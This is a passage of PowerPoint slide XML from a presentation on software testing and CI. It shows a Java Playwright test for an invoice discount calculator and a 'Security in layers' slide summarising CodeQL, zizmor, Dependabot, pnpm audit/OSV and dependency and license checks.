                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>).fill(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"10"</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page.getByLabel(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"Discount (%)"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>).fill(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"10"</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page.getByRole(AriaRole.BUTTON,</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t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>new</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> Page.GetByRoleOptions().setName(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"Calculate"</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.click();</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  assertThat(page.getByTestId(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"total"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>)).hasText(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"990.00"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="E4E6EB"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Self repo note"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5120640"/>
            <a:ext cx="11091672" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 20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3" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5120640"/>
            <a:ext cx="10698480" cy="54864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300" b="1">
                <a:solidFill>
                  <a:srgbClr val="6E3CBE"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>@BeforeAll </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>starts InvoiceServer on a free port: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>every test saves a trace in target/playwright-traces.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Icon 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{973597BE-D09E-CCE1-6E55-30E482C6BAE8}"/>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84703" y="1690543"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Icon 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B10F2BAB-9897-8D66-1E58-20B81FFEED9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6381415" y="1690543"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="195911946"/>
      </p:ext>
    </p:extLst>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Security in layers</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Code, workflows and dependencies are each covered by a dedicated check</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Card CodeQL (SAST)"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1508760"/>
            <a:ext cx="3520440" cy="201168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5" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1737360"/>
            <a:ext cx="566928" cy="566928"/>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6" name="Icon 6" descr="Search"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="913303" y="1873423"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="1737360"/>
            <a:ext cx="2331720" cy="56692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700" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CodeQL (SAST)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2441448"/>
            <a:ext cx="3063240" cy="941832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Data-flow analysis of TypeScript, Java and the workflow files. Push, PR, weekly.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="6E3CBE"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ Security tab</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Card zizmor"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4334256" y="1508760"/>
            <a:ext cx="3520440" cy="201168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0" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4562856" y="1737360"/>
            <a:ext cx="566928" cy="566928"/>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1" name="Icon 11" descr="ShieldCheck"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4698919" y="1873423"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5294376" y="1737360"/>
            <a:ext cx="2331720" cy="56692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700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>zizmor</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4562856" y="2441448"/>
            <a:ext cx="3063240" cy="941832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Audits workflows: injection, excessive permissions, unpinned actions, leaked credentials.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="26AF72"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ Annotations, job fails</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Card Dependency Review"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8119872" y="1508760"/>
            <a:ext cx="3520440" cy="201168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5" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8348472" y="1737360"/>
            <a:ext cx="566928" cy="566928"/>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6" name="Icon 16" descr="Hand"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8484535" y="1873423"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9079992" y="1737360"/>
            <a:ext cx="2331720" cy="56692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700" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dependency gate</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8348472" y="2441448"/>
            <a:ext cx="3063240" cy="941832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OSS Compliance runs on every PR that changes dependencies: CVEs + licenses.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A9BCD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ PR check</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Card Dependabot"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3794760"/>
            <a:ext cx="3520440" cy="201168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0" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4023360"/>
            <a:ext cx="566928" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F06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1" name="Icon 21" descr="Bot"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="913303" y="4159423"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="4023360"/>
            <a:ext cx="2331720" cy="56692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700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dependabot</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4727448"/>
            <a:ext cx="3063240" cy="941832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Weekly grouped update PRs for npm, Maven and Actions; instant security PRs.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F06400"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ Pull requests</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Card pnpm audit / OSV"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4334256" y="3794760"/>
            <a:ext cx="3520440" cy="201168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5" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4562856" y="4023360"/>
            <a:ext cx="566928" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D7261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6" name="Icon 26" descr="Bug"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4698919" y="4159423"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5294376" y="4023360"/>
            <a:ext cx="2331720" cy="56692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700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pnpm audit / OSV</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4562856" y="4727448"/>
            <a:ext cx="3063240" cy="941832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CI gate on known vulnerabilities in the full dependency tree.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D7261E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ Fails the CI job</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Card OSS compliance"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8119872" y="3794760"/>
            <a:ext cx="3520440" cy="201168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30" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8348472" y="4023360"/>
            <a:ext cx="566928" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">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31" name="Icon 31" descr="FileSpreadsheet"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId8"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8484535" y="4159423"/>
            <a:ext cx="294803" cy="294803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9079992" y="4023360"/>
            <a:ext cx="2331720" cy="566928"/>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700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OSS compliance</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8348472" y="4727448"/>
            <a:ext cx="3063240" cy="941832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Daily license + CVE policy check with a CSV for review.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
